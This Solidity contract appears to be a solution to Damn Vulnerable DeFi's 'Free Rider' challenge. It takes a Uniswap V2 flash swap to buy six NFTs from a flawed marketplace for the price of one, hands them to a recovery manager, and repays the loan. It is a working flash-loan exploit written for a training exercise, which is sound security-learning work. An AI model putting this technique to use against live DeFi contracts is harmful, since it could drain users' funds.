// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Recover is IERC721Receiver {
    WETH public immutable weth;
    DamnValuableToken public immutable token;
    FreeRiderNFTMarketplace public immutable marketplace;
    FreeRiderRecoveryManager public immutable recoveryManager;
    DamnValuableNFT public immutable nft;
    IUniswapV2Pair public immutable uniswapPair;
    address public immutable player;
    uint256 constant NFT_PRICE = 15 ether;

    constructor(
        address wethAddress,
        address tokenAddress,
        address marketplaceAddress,
        address recoveryManagerAddress,
        address nftAddress,
        address uniswapPairAddress,
        address playerAddress
    ) {
        weth = WETH(payable(wethAddress));
        token = DamnValuableToken(tokenAddress);
        marketplace = FreeRiderNFTMarketplace(payable(marketplaceAddress));
        recoveryManager = FreeRiderRecoveryManager(recoveryManagerAddress);
        nft = DamnValuableNFT(nftAddress);
        uniswapPair = IUniswapV2Pair(uniswapPairAddress);
        player = playerAddress;
    }

    function recover() external {
        //Need to call swap from pair for flash loan
        uniswapPair.swap(NFT_PRICE, 0, address(this), abi.encode("flashloan"));
    }

    function uniswapV2Call(
        address caller,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        //Use msg.value 15 ether to buy all NFTs from marketplace
        weth.withdraw(NFT_PRICE);
        uint256[] memory tokenIDs = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIDs[i] = i;
        }
        marketplace.buyMany{value: NFT_PRICE}(tokenIDs);

        //transfer NFTs to recovery manager
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(player));
        }

        //Repay flash loan
        uint256 fee = (NFT_PRICE * 3) / 997 + 1; // UniswapV2 0.3% fee (ceil)
        uint256 amountToRepay = NFT_PRICE + fee;
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(uniswapPair), amountToRepay);
    }

    receive() external payable {}

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        return this.onERC721Received.selector;
    }

}